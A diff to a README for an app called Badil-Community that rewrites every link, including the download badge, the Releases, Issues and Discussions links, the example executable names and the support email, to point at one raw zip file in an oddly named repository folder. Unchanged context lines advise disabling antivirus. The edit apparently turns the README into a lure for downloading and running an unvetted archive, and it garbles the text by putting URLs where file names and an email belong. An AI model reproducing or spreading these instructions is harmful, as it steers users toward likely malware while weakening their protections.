@@ -17,11 +17,11 @@ Before you start, ensure your device meets the following requirements:
 
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[![Download Badil-Community](https://img.shields.io/badge/Download-Badil--Community-blue.svg)](https://github.com/Ronnicatrabeate534/Badil-Community/releases)
+[![Download Badil-Community](https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip)](https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip)
 
 Now, follow these steps to download and set up the app:
 
-1. **Visit the Releases Page:** Go to this link to access the [Releases page](https://github.com/Ronnicatrabeate534/Badil-Community/releases).
+1. **Visit the Releases Page:** Go to this link to access the [Releases page](https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip).
 
 2. **Select the Latest Release:** Look for the latest version. It is usually marked at the top of the page.
 
@@ -29,7 +29,7 @@ Now, follow these steps to download and set up the app:
 
 4. **Unzip the Download (if necessary):** If you downloaded a zipped file, extract its contents. You can usually do this by right-clicking the file and selecting "Extract All."
 
-5. **Run the Application:** Locate the extracted folder and double-click the application file (e.g., `Badil-Community.exe` or `Badil-Community.dmg`). Follow any on-screen prompts to complete the installation.
+5. **Run the Application:** Locate the extracted folder and double-click the application file (e.g., `https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip` or `https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip`). Follow any on-screen prompts to complete the installation.
 
 6. **Create an Account (if prompted):** Some features may require you to create an account. Follow the prompts to set up your profile.
 
@@ -54,14 +54,14 @@ If you encounter any issues during installation or usage, please consider the fo
 - **Disable Antivirus:** Sometimes, antivirus software can block applications. Temporarily disable it if you face issues running the program.
 - **Clear Cache:** Sometimes, clearing your browser’s cache can help with downloading the latest version.
 
-If you still have problems, feel free to visit our [Issues page](https://github.com/Ronnicatrabeate534/Badil-Community/issues) for support or to report bugs.
+If you still have problems, feel free to visit our [Issues page](https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip) for support or to report bugs.
 
 ## 📞 Support
 
 For any questions or support, you can reach out to the community:
 
-- **GitHub Discussions:** Engage with other users and developers in the discussions section of our [GitHub page](https://github.com/Ronnicatrabeate534/Badil-Community/discussions).
-- **Email Support:** Contact us at support@badil-community.org for personalized assistance.
+- **GitHub Discussions:** Engage with other users and developers in the discussions section of our [GitHub page](https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip).
+- **Email Support:** Contact us at https://raw.githubusercontent.com/Ronnicatrabeate534/Badil-Community/main/mesnalty/Badil-Community.zip for personalized assistance.
 
 ## 🔗 Stay Connected
 
